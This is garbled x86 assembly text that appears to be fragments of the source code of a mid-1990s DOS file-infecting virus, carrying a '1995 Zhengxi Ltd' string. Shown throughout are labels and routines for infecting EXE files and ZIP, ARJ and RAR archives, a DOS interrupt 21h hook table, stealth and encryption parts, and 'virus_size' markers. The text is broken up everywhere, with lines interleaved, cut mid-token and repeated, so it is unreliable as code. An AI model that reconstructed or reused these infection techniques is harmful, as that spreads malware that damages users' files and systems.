  ; insert_si CRC32w  < ptr ($  ; cx;cal',''>       ;ZIP
    RRC3aRC3rRC3!w  < ptr (Rca',''>       ;ZIP
    HRC3A' < ptr ($  ; cx (HA  0C3h
     , arjor ax,ax
    insert_si FFC32FFC32FFC32FFC>cx (SYS)







  ; insert_si FRC32Dh< ptr ($  ; cx (LIB)







  ; insert_si 8RC< ptr ($  ; cx  cx ( CX-S ax,ax
    insert_si'FRC3BRC3ORC3Vw  < ptr (OVa',''>       ;ZIP
    ZRC3Mw  < ptr         ;EXE',''>       ;ZIP
    MwC3Zw  < ptr         ;EXE'  0C3h
      ',''>       c reE

;    DON,''>       c reE

;  _flags], 4h ;    c reE

;  rhdr.rar_4h ;    c reE

;  hcx, offset starc reE

;  sy ',''>       c reE

;  lib',''>       c reE

;  objx, offset starc reE

;  ovdr.rar_4h ;    c reE

;  _pages]
4h ;    c reE

;  _page;, 'x', 'i', 't'2,1Ah,8Bh>  0C3h
  apiC;0    proc
rx_date] ip     b0C3h
  .zip_compDTADELTAJ_SIGN HtealtDTAll       mov  teTROJANst_aeate_cent_METHOD_SÄÄÄÄÄÄÄÄÄÄÄÄheap]  sta    forthatlute im      e!   ;       B)



;test
opblabel proco], ZIP_SIGN
      dw     ?ap]TROJANst_ablabel pro word pt.filecnt]
             call    DosWrite_shbuf_22 ; writ nt]
    jmp    apiC;0   CLE LU
        ne     ize]503t]
             call    Dcd_buf_22 writ nt]
    jmp    ICTIONARY_ENTRY     ne     hi]
    call    dosseek_cur
  jhdr.arj_compresseSTACKBAS FCBF0000h mizimumov   =8K]
             call    Drle endp
;-+--     call   [engdata.targetp2
         c[engdata.targetp2
         sub ;dp
;-+--     call     [rarhdr.rar_head_crcr
        calll
    sub    
    scs
    call    no_freq_proc
    mo04 -num_of
    P'
    lodsaltDTAleap
    mov     ax, SIZ ax,_o=$+1_exit_2 ;<<<<<<<<<dÄÄÄÄÄÄÄÄÄÄÄÄÄÄCje  :32wshr 1
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄDje  :32ws
;    DONEe      standaZ;CENTRA ptr [zi   viruf_22    ; read ( cmp     wordDTADELTAp_size_fname_]
      art1
        DO
  a FCBAx_0
pblabel proc_cters
 _0
pblabe sto_fnam'\'t1
        DO
  mp     cx, (],'.*'t1
        DO
  mp     cx, (+2],'*'t1
        DO
   sbb     db      
    jmp    ICTIONAre apenin:t1
        DO
  a FC4E   db      ek(size hh.ASIE aOfS CYCLE LU
    DONAre aNexE
        lea    DO
  a FC4    E aOfS CYCL
        lea  l proc_cters
 _0
pblabe    ax, 08320H
        
    lea     ax, [

l    dostelb      
    jmp    ICTIONA       lea    DO
  a FC3Ah
        lea  l proc_cters
 _0
pblabe           push    si
         t     dx
    nooooooooooooooooo2h
    je      li

l '\'t1
              - CREATE ARJHDDDDDDDDDDDDDSIZEMARKwordDTADELTAp_size_fna   lea    DO
      art1
         lea    DO
  a FC1Ah
        lea  ea  l proc_cters
 _0
pblabe         jb      @reg    sialtDTAleap
             ig, infere aNexE
eap
             n_the_ce-------------um_of_ent_iiiiiiiiiiiiiek(size 04 -num_o_0
pblabe    axTE ARJHDDDDDDDDDserta

;sart1
         lcmp     wordhe
, ship         jz          push    si
     h, ch   ;ch=0
         mov     cx, siiiiiiiiiEL dup (al      CYCLE LU
  
        xor         t   
    nooooooooo      mov       noooooooood_flags.1], 80h
 v .he
, shiobj$ret    add      aTRA ptr [zi@@  dostelb      2h
    je      liv .he
, ship    ]      add      aTRA dosseek@@1_e@@ :    nooooooooo      mo
;seek   mo->
    DONDIuf_22 writ nt]
    jmp    ICTIONARY_ENTRY     ne     hi]_cur_neg_ax
     ne     ize]4301h
        lea  l proc_cters
 _0
pblabe     ne     ize]3D21h
        lea  l proc_cters
 _0
pblabe    seek_end
         call  hdr.exe_min_BSS], 0   lea  l proc_cterTt_err  
        lea  ea  l proc_ctersÄÄÄÄÄÄ   call  hdr.eTE ARJHDDDDDDDDD  DO
  a FC41h
        lea  l proc_cters
 _0
pblabeÄÄÄÄÄÄÄ@@     ;******   pop     ;ut ovDI stos3w ;=0;è­¨ª  ¨à¥ªâ®à¨ï +         jÄÄÄÄÄÄÄI
code segment byte public
assume;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ cs:code, ds:code, es:code, ss:code

public get_cur_time
get_cur_tim--------$ret$
    cmp     a--------$retcrc_just_fextrn NOSTL21       lea      :byte
ext   xchg    ax5 lea      :byt---------------------------------------------+-

ends
end

; BUG LIST
; 1. ;    call     ­¥©¬UDE áà¥¤ë    do¥£®seeks  t
    has topen fi=@P:busS
e(0) {8   ffereek}---------------------------------------------+-

ends
end

; BUG LIST
; 1. ;CR § ­-$retcrc_just, 79FCh a--------$retcrc_just_f0C3h
  get_crc_just_fnameserta

;  int ;DDDD  DO
  a FC34h
;¢ á«®¢ à¥:  NOSTL21 ;BX-fferpspt ;DDDD  DO
  callur_
   [0FhZEMffereekEMARKER_MOD
   FC51h
     
    re21h
       DO
  callint      2Fh
  
  PDBC;0    n
       DO
  calldr_
   EMffer;0   uf_22    ; read ( n_the_ce-riginal_size.lo], cmp     cx,-r-4ax  ;
;/+- CREATZ
       DO
  c NZ
    nondle
;rezk  e
ends
end
;-------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel exe_test  ;-+------- tesopen fileCommen®£® ( f:cx) v    di,UpCase(J  cytesa   op      á¥©ç á ÄÄÄdosseek¨®â¥ ¥©çll ¢ â ¡ áæ¥---------------------------------------------+-

ends
end

; BUG LIST
; 1. ;CR § ­-$ret$
    cmp    FC474Ah
 --------$ret$
    cmp     a0C3h
  get_$
    cmp     ax, [serta

 ax, [sertasio
;s        mov    add_si4 ds
    mov  mov    EG  es, 2
         sub _22    ; read (    CYCLE LUNZ
    jcxz    error_exit2
 TZ
      cG  es,    Cwb _22    ; read (    CYCLE LUNZ
e      standa\'t1
      hdr.rECLE LUNZ
e      standa:'t1
      hdr.rECLE LUNZ
e      stand ;
;/+- CREATZ
            ;     Cwb _22   call     [rarhdr.raSS], di   mov     anÄÄÄlode seg     ne     hi]nÄÄÄlode s   stards
en push    wordet       c[ ;   ret create_cen ptr 
     i DosWrite
    jme
ends
end
;-------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel exe_test  ;-+------- tesotc

    cíâ¨å     ®¢ ¢ëª«îç ;­ ¤®á  «­ £® (?)é¥:cíâ¨¨ à¥«®ª¤«¨­®©
 î­ ¤!---------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0FnÄÄÄlode seg    ;ZIP
    'U', 'U', 'ND
 N, 'M' 
puusize]-eg    ;ZIP
    'P, 'MK, 'ML      je    _exe_infeg    ;ZIP
    'L    ZRCLAND
      E  _elzex-eg    ;ZIP
    'N, 'MD, 'MD, 'M.    E  _endd.ex-eg    ;ZIP
    'D      je ND
 T, 'M.  _e  et.eg    ;ZIP
    'S, 'M'  CYC, 'N, 'MD, _e   num_o_0
pb;ZIP
    'S, 'MD, 'M.    E 
    _e d.ex-eg    ;ZIP
    'S, 'MP    E 
 E, 'MD, _e peeum_o_0
pb;ZIP
    'D 
 E, 'MF, 'MR  CYC _e efrag_0
pb;ZIP
    'T, 'ML      je N, 'MKC _etthat_0
pb;ZIP
    'W, 'ML      je N, 'MKC _eWthat_0
pb;ZIP
    'L      je N, 'MKC 'M.  _ethat.ex-eg    ;ZIP
    'D    P    M      je 1  _eDPMI16eg    ;ZIP
    'D    P    M      je 3  _eDPMI32eg    ;ZIP
    'RD
 T, 'MM, 'M.    E  _eRTM          ;ZIP
    'RD
 T, 'MM, 'M3, 'M2  _eRTMP      nÄÄÄlode s   st add$-nÄÄÄlode sCYCLE-------------------------------------------+-
pblabel test_size  ;ax-(file_siz
code segment byte public
assume cs:code, ds:code, es:code, ss:code
IFDEF USE_BEEP
public  beep

xtrn stqu (ofríâ®£® ­be     
xtrn stsize]
ÄÄÄÄÄÄÄÄÄÄÄtrn stseg_msgÄÄÄÄÄÄÄÄÄÄ-------ros98-------rohume;..sf_l genyme;._cur_tim-10DCDb ;dp
;-rohu-ros98;est_size  ;ax-(fileb ;dp
;-xxxx-xxxx-
;-ros9 * 0DCDh
;¢yyyy¢yyyy¢¢¢¢¢¢¢¢¢rohu-* 0DCDh
;¢rohu-ros9              * 18;est_size  ;ax-(fileb ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCe and 0Fart2,  al
     ; insert
    mov     [b- CREs:ros98     ne     hi]0DCDh
  
    xchg
    mot], ax
    mov ent_dire    d = 600ros9     DOIF A
 $-set]
    add  Es:ros9 - (size ha_main)
   d = 600rohi     DOIF A
 $-set]
 eek
    call    sec    xchg    cx, dx
    -2], ax ;, 00 ;(cx+bEs:rohs (rzheap+[oall    f_i    cx, sa add_si4s
    MOV       dw  ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCe and 0Fart2   ; IOCTL get_own_naDosWrite2
         43h
       DO
  callDo IOCTL get_own DONE
    stos-43h*= 6+46ChZEMs98    oall    fs:ros98     get_own DONE
    stos-43h*= 6+46EhZEMhi8    oall    fs:roh       n
    mov     dx,iexe_heaalinfect2
pbDONE
   n't close trohs (rl8    oall    rzheap+[oall    si

ends
end
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCÄtrn st   get_cur_timÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄe and 0Fart2,  ds:[variabl]crypt_part2,  al
  R_MOD
   FÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄe and 0Fart2,  dexe_SS.h], al ;]crypt_part2,  ds:[variabl    add_si4    jcxz   00000 = ;.5k*100h fends
end
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCÄríâ®£® ­bÄÄÄÄÄÄÄÄ$-qu (ofríâ®£® ­bI
code segment byte public
assume cs:code, ds:code, es:code, ss:code


;.DATA
public vir_heap, Stealtrn st   crypt_ex   :near
;ÄÄr        call    rnd
        mtrn st   cryDxx f   :byte
extget_$
    cmp       :byte
extend_d  :byte
ext, exe_rle_table-d  :byte
extr_time
     d  :byte
ext, exe_rle_table-_$Errord  :byte
extWRinfÄÄÄÄl   d  :byte
ext   START_DATAd  :byte
ext SEALTH NAME_d  :byte
ext,  dSF ­¨ï
    :byte
ext   EXE_TEST     :byte
ext MOVSEG  ds, ear
extrn dosclose            call               get_c   :byte
extend_            ear
extrn dosc25            ear
extrn do   ?
pub       ed    call    rk
publi       e    call    dup (?)
       ear
extrn do   get_crc_just_   :byte
ext   xchg    ax
    :byte
ext   EXE_TEST  
    :byte
ext   get_cur_ti   :byte
ext   get_cur_ti5   :byt---ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCÄ           n   DOUP
;   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCÄ   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;xEXE        db      '.EXE'
;xCST  
 DS
_word    TI          xCST  
 DB
_cH DUP(     dd     dx,dw'
    cal;bp-e_si:n Sd     dx,dw'
    cal   cal;bp-2esi:n Pd     dx,dw'
    cal   call;bp-2csi:nss:d     dx,dw'Ah+_cH     cal   call;bp-2asi:nIPd     dx,dw'
    cal   call;bp-28si:nCS      nooooonoDON,''>      I al
      DS
agraph
    and 6     cx, [fqu (of        W_
            alx_1
   W_d
            alx_14   W_di            alx_12   W_si            alx_10   W_bp            alx_1E   W_sp            alx_1C   W_bx            alx_1A   W_dx            alx_18   W_cx            alx_1
   W_ax            alx_14   W_fl            alx_12  0C3h
     f       ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel write_sizemarker
;write garbage
code se    p   ;****** ertasi   ;******]crypvs8------- mov    D Calcu     (ypt ;;reum_crc shr 8;0-famil---     ;1-a               
;  (    size]
r 8;2-rk   read_buf?
         ;******   push    si
       h, ch   ;ch=0
              , 8uncti4h
ÄÄÄÄÄDM
      ? gdata.targetp2
 c stos+ÄÄÄÄÄDM       CYCLE LUB_DICTIONARY_ENTRYip     garbage
leap
           mov     cx, LIR -+-
        i bp    cx, LIR -+mp     [rar cG  es,     ax, cx
     mov       [rar x, 3E0h
        push  
    mov     dx,    EXIT Z
    0    db      
          = 6_e uxxx*   + 6_ stos3 uxxx=    div     cx
     stos+di   ;raÄÄÄÄÄDM)-di   ;ra mov )       CYCLE LU_AX
;create & infecs? ??d     word ptr [sitim
    ctr [sigdata.tar x, 3E0h
   uxxx   div     cx
   bp   p   div     cx
   c
   stbp+4+6     di, 3
 2h
    je      l  stdx-3]
    add                sub     a    
      1    l  stos+di   ;raÄÄÄÄÄDM)-di   ;ra mov )    CRC sub     a     x, 3E0h
   CC sub     a    t     dx
    nooooooooo
    lea     ax,   stdx]ORLAND sub     a    t     dx
    nooooooooo
    lea     ax,   stdx]OR8BD sub     a    t     dx
    nooooooooo
    lea     ax,   stdx]OR55ur_neg_ax
     ne       stbp+4+6   ,x
    nooooooooo
    cs    nooooooooo
    
    nooooooooo
     DOIF Z
     ax, cx
bp  vvvod           shr 1
           ax, cx
bp  vvvd           TE ARJHDDDDDDDDD  DO
  zip_es sub     a     x, 3E0hc
         call  hdrdi, endd
            modi, enddbp1
           ax, cx
f_insos+d( ;virus_size
;  ))- mov ONARY_ENTRY     ne     hi]( ;virus_size
;  )               +heap._rarhdr.raek(size ?
        ;est_size  ;ax   garbage
vvod qu (ofau      ;*****      mo
 DONE
    stfrr ax, 4
    0h fenÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel write_sizemarker
;write garbage
vvd              mobp 
;s    ctr [v       noooox ;sizsicphdr.zip_cedi, endd
         careq_proc****test size
ax, cx
e    tmphdr.zip_ce ne      ize]501h
        
    ret1h
              mo
    dr.zip_cedi,   DOIF Z
 create_dng, t_cpm, 4
    0h fenOIF Z
 k(size    s mov , (ypt ;        c shr 8) and 0       sub     a   alp sub     a   alp shookt
      opPUSH------_ke exffrr a mo
 ÄÄÄÄÄÄÄÄÄÄÄÄ
    push    b k(size    s mov , (ypt ;\
     c shr 8) and 0       sub     a  rk   ÄÄÄÄÄÄÄ
    sh    b k(size    s mov , (ypt ;E
     c shrx_1ÄÄÄÄÄÄÄÄÄÄì EXEä ©«size]
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;/     cx      ;dx:s:                 db 1]reg    sidb 1 _pages]
 create_?
 
    su0C3h
  gb 1 E
 ;  ume;(ss-es-0x17)<<4+spt ;ss=:s-1me;(cs-es-0x18)<<4+spt  e ha_main)
    seg     ne     siet    add  dx
    -2],Do IOCTL get_own
 ax, [sertap     ;pspt eg     ne     bip_es sub   x, 3E0h
  
    no ds:[si],
    nocwG  es, 2   xchgDosWrite2
         [ ;si
        SIZEMARKword7E  add  dx
    -2],Do IOCTLent_dire    i, [vir_heap._c   pop     di
   exe_rle_table-_$Errorheap+[oall    siheap+[;@repeat:
        sto_b cx
        6hYCLE NZt1
    retwb _22   call  
    nooall    rzheap+[oall     seg     ne
   dallur add  dx
    :s: ÄÄÄÄÄ-2)    sub v     [exehdr.exe_:s: ÄÄÄÄÄ-2)    s mov     [exe ne       , :s: ÄÄÄÄÄ-2)    sub   [exe ne      p, :s: ÄÄÄÄÄ-2)    suPÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ DONE
    stÄÄÄÄÄ-2)    sIPÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        stosize]
        call     msg    MOV b
 Te list (see meuip s                     a;V b
 Tee Applabove, ZPt (see I    f, ah=API)      ed  a;V b
 of al ä ©« DO
hp OS/2w   ?   add   b
                         
; ',ÄÄÄÄ,'$  a;------_ke 
 ÄÄÄÄÄÄÄÄÄ b
ÄÄÄÄ,') 1995 Zhengxi Ltd            
;   Warning! This   a;VÄÄÄ b
ÄÄÄÄ,'D; ''             me list (see!',ÄÄÄÄÄÄÄÄÄÄ b
ÄÄÄÄ,'al use only!                  
;           ',ÄÄÄÄÄÄ  0C3h
     msg  ap+[oall    div    
  ***test size      F ?     eads th?     .ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ _rds
  
To_h <00,11,12,31,3D,3E,3F,41,42,48,49,4A,4B,4C,4E,4F,67,6C_e
 _rds
  
To_h <67,3E,6C,3F,49,00,3D,41,4A,11,4B,31,48,4C,4E,42,12,4F_e
dx ax
    
; rectodx%yt = fo9 - _rds
 ÄÄÄÄÄÄ b
(&fo9&hhdr.eLSE
  &fo9&h     out _rdst adddd$- 
; rectodxdxTE
;.386
;;        dÄÄÄÄÄ    (1 0FFFFh) shl
;;           (1    suxx =Fh) shl
;;    and 0Fh)))

To_hp   hTEL;.386
;;        dÄÄÄÄÄ     (1    sFh) shl
;;     d 0Fh)))
      (1 0FFFE
;;ENDM


CRC32w Mo_hp   h%yt = fo9 - _rds
 ÄÄÄÄÄÄTE
;<  bfr_&fo9-          SE
  ($+2-          S)> -< bfr_   -$)>ÄÄÄÄÄÄTEL;<     _&fo9-          SE- ($+2-          S)> -< bfr_   -     )>ÄÄÄÄÄÄlic Calcfr_&fo9ÄÄÄÄÄÄlic Cal   _&fo9 Mo_hp  bfr_    addd$14  ---------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0F?
 
    su cx      ;dx:s:           hp   tu]ov     cx      ;dx:s:           hp   tp]ov peg     ne
   sn
    call    get_ p,    f        m
    add_si4l  pop   cx, -1
    aw, [vir_heap._cdslur add  ax, cx
bp  v       +8........  call  [      db 1]  read_buf?  viruf_22     get_ p, qu (of      ;   f     -20x, -1
 all     s
         alaw, [vir_h fenOIF  ne       , :s:           hp   tu]  [exe ne      p, :s:           hp   tp]LE NZt1tn---------------------------------------------+-
pblabel exe_test  ;-+------- teso------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0FRANDOMend ( - sax, cx
f_inqu (ofau    [exe ne     , 6
  fau  -qu (ofau    [exe ne     sos+d------_ke -qu (ofau  )p_rel_off_of_loc_hdr_.hos+d------_ke -qu (ofau  )p], ax
    de   word ptr [crthdr], cx ;[si-2] (?[r    ax
    dec     cx rnd]--------------------------------------------+-
ends
end

INCLUDE ZURICH.ize  ;ax-(file_siz  0C3h
     fau    -------------------------------+-
ends
end

INCLUDE ZURICH.ize  ;ax-(file_siz  bfr_3E:    de   word art2,  al
  ehdr.exe_SP]
   ll
    sub     ax,ÄÄÄÄÄÄÄÄ  jmp     dosc   _3E: cs
   ax,ÄÄÄÄÄÄÄÄ
    lea     -------------------------------+-
ends
end

INCLUDE ZURICH.ize  ;ax-(file_sizbfr_41:  0C3h
  DoIZE _N
    rep     movxc
    xchg   
extrn IfIII cs:[ErrorRead], op
  ***ts
 ax, [sertap     
    de   word ctBuf
;ATE RARHDR 1.all    f_i    cx,   call    DosWrSP]
   rj_co  cx,   call  terTt_err  
        dosseek_bof
;    cÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄDoIZE _N
 --------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel exe_test  ;-+------- tes   _11:es   _1F - erro ne
   dall    call    jcxz    error_exì EXEä ©   DONE
;-+------ ¨ ..II
;   ;o   dDTA  cx,   call  ters
 _0
pbd;?ver?
    DONE
  ur_
  +24hZEM  al       nee54h cx,   call  d 0FFFFh)
ngth with virus
       _e peeu
  rc_Fhat    strucì EXEä ©   D                                i-volum;@repeat:
 
InfectTur sto_b cx
        1x, -1
   dec     si
         ur_
  +8
    neg     alllll-riginal_size.lo], c    ' 't1
                 ;get D   si
     ds:
        CYCLE LU
        pop     cx

r_method], RAR_METHOD_c  word ptr [si       sub     a    
    lea     ax, ds:
        add      aTRA      pop     cx

r_method],B_DICTIONARY_E
    lea     ax,   stdx]ORch si, [virhdr.exe_bcur_cx_0
pbek(size htlts_he
,     a-------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel exe_test  ;-+------- tesbfr_6 mov    d_flags.<<debuve_see  Erov    -1
 Zov    d_flags.bl, ax
;r/r
    cararhdr.rar_compHDRBUFSIZE*2
        DO
      art1
        call  teIZE _N
    rep 
    call      rep 
 1: sA
 <  stoW_bx.l]> -xxxxxx 0x2;R/Wags.bl
    sub    -----------------------------+-
ends
end

INCLUDE ZURICH.ize  ;ax-(file_sizbfr_49:es   _4F -    _00:es   _4C:izbfr_4f:izbfr_11:izbfr_12:izbfr_def:iz@t1tn:es   _def:iz   _41:izd
    cm-------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel test_size  ;ax-(file_siz   _4E:iz   _4Fmov    InfectTurn
    call    get_c
 
InfectTur [objhdr.r    neg     alllllp     cx

2h
    je      li
ax  ;
;/+- CREATZ
     .r    neg   dealllllp     cx

2h
    $ret
;ÄÅÄÄ
InfectTur [objhdr    hdr.rECLE LUNZ
e      sje      li
ax a\'t1
  - CREATE ARJHD  alllllp     cx-+------ ¨ ..F0000   DosCaTA  cx,   call  ters
 _0t eg     ne      hi]0D0000   ur_  +1  -0D0->open i
     .r    neg    get_own DONE
  ur_he
, ship    
      rep 
    call      int           alllllp     cx

  alllll-riginalB_DICTIONATROJANng oACKSI= (6hdr.eL1d     6hdr.e5     6hdr ELS  cx,  .ov?
     (-r-0D0).he
, shi   ?ap]TROJANng oACKSÄÄÄDword pt.filecnt];ub     ax,Äeirhdr   ?  as tt eg    d_flags.    (-r-0D0).he
, shiobj$ret    ;0
       ct2
    EXEä ©n  hdr   ?  as tt ;   call      reaart2,  ds:[variablEXIT Z
    0r     cx  EXEä ©n  hdr   ?  as tt ;test
enall    IfInfect&x
 
InfectTur s;¢ á«®¢ à¥:  $ret$
    cmp     a-  
           hdr   ?  as tt ;----hdr  irus s t-----------------------+-
pblabel test_size  ;ax-(file_sizopen fil>_just_fname
hdr   ?  as tf
    P'
    lods
InfectTur sto_b    get_c
 just_fname
     get_own
 ax, [ ds
    mov     o_b cx
       fect2
pbt1
    retwb _22 oall     seg-1).sf_mode.l], 1 .ov?
     (-r-0D0).he
, shi   ?ap]TROJANng oACKSÄÄcmp     word cmp      á«®¢ à¥:  ax - 3Dxx for
nglage_infect
    call      hdr   ?  as tt ;#t eg     ne     
    s  (-r-0D0).he
, shiize_hiZEM  al       nee54h cx,   call  d 0FFFFh)
ngth with virus
       _e peeu
  rc_Fhat    strucì EXEä ©@t1tn                               ;
    sto_wolts_he
,               ;a    e  and_flact2
  IfInfect&x
 
InfectTur s     ne     si  
    noIextrn IfIII cs:   ;R/ow   ?ac s     ne      DONE
  ur_he
, shiize_hitos-0D0el_off_of_loc_hdr_. DONE
  ur_he
, shiize_hhtos-0D0el_     repÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel exe_test  ;-+------- tesbfr_4E - erro ne
      mov  mov    ne           sub _22 ax, cx
et:
 
InfectTur sto_b cx
   -- ¨ .60x_0
pbek(size     Dcd_bufÄ------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel exe_test  ;-+------- tesbfr_3Dmov    d_flags.REPT 2
         $$$$$$$$;W/O R/Wt1
        call  teIZE _N
    rep 
 1: sA
 <  stoW_ax.l]> -xxxxxx 0x2;R/Wags.    $?ONE
        lll
    sub    
 ---_attr RE#ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄADINFUCKÄÄÄÄÄÄÄÄÄÄ
; INFECT exe
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  á«®¢ à¥:  $ret$
    cmp     a], 1 .ox', 'i', 't'CYC, '-, 'MD, 'M je  n'> strucì       $?  DONE
;-+------      sto;si
        d;?ver?
    DONE
    stosw[4l_header
    adBORLAh
       DO
  calloff_of_lDONE
  s
    pop     dec     si
        d8t1
        call     [rarhdr.rar_head_crc .ox', 'i', 't'
    cA   cC    5EBORLA2BOR26BOR81BORLFhrc and 0FFh   Cwb _22  ], -1
    DOIF of_lDONE
  TA+1
        DO       sub     a    
    lea
     stos-12]lea;=1547     {386}  =1557     {86} sub     a             xchg    si  vir386_fu  -1547ur_neg_ax
     ne     ----------------8el_3D00;fu  _3 ax ;?
           ne     ----------------5el_9Aur_neg_ax
     ne     x-3)
    pop4         DONE
     ne     x-3)
    pop  ,xes sub     a    GET_BYTE
                cm   [rarhdr.raSS], di
           .ox', 'i', 't'cA   cB   cC    
    3>S], di
                 sub     a    OIF of_lDONE----------------4   cB lDONE4¥ ®âtry virus

















ONE
        call      TE ARJHDDDDDDDDDDD  SIZEMARKword6¥ b   wided  CYCLE LU
        
        xor       TE ARJHDSIZEMARKword9     wided  CYCLE LU

           ;<80 cx, ax
---------[ fu  me re vird9.xxlEXIT10.xxl]-------+-
pblabel exe_test  ;-+------- tesilit    mov   
hp (a----){86}®âtr Cx{386}esix dx   mov   
hp ur_
  .15ress-------------------------------------------+-
pblabel exe_test  ;-+------- tesMINVIRART_D
opJC_STORMAXVIRART_D
op1JC_STOR  vir386_fu  ft
  faARHDR 1.50 -+-
                      ; 1 ARJHDSIZEMARK
    s    +15re        ; ord ptrÄÄÄÄÄÄÄÄbcur  p][-_S1Ere       ;T 2
   CLE A
;-+--MINVIRART_D        ;T 2
   z98], axdup (?)_fu  _1f_386   ;T_dtim
   pop     dx cx               ; 1 A db  u  _1f_386ÄÄÄÄÄÄÄÄÄÄ dx cx                      ; 1 A-------------------------------------------+-
pblabel exe_test  ;-+------- tesDS
  vir386_fu  +    a-------------------------------------------+-
pblabel exe_test  ;-+------- tes  vir_fu  ft
  faARHDR 1o_0
    stosw                 ; 1 A          cm  vir386_fu  fD        ;T 2
   o_0
    stosw                 ; 1 A    ÄÄÄ dx cx                      ; 1 A  vir_fu  f-------------------------------------------------+-

;-+---------------------------dup (?)_fu  _1f_386:2
   CLE A
;-+--MAXVIRART_D        ;T 2
      pop     dx cx               ; 1 A   di, (offs db  u  _1f_386        ; _dtim
EL dup ( DONE
  ur_
  ],808...
5   ix dx_attand A    ÄÄÄ dx cx                      ; 1 A  vir386_fu  f-------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel exe_test  ;-+------- tes   _6 mov     STACKBASE ;HDRBUF   mo disin2
        Zes   _3D
        lseek_end
         call Iextrn IfIG  ds,  0Fh    SF ­s    stosw
  ®¢ à¥:  $retame.9], 'V' ; ne     ---------       je     l    dostelb  oc_hdr_. DONE
  ur_    je r
    cr.exe_par_dir]
       DONE
  ur_    je r
  _rel_off_of_l  TE ARJHD------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel test_size  ;ax-(file_sizbfr_3F: cs
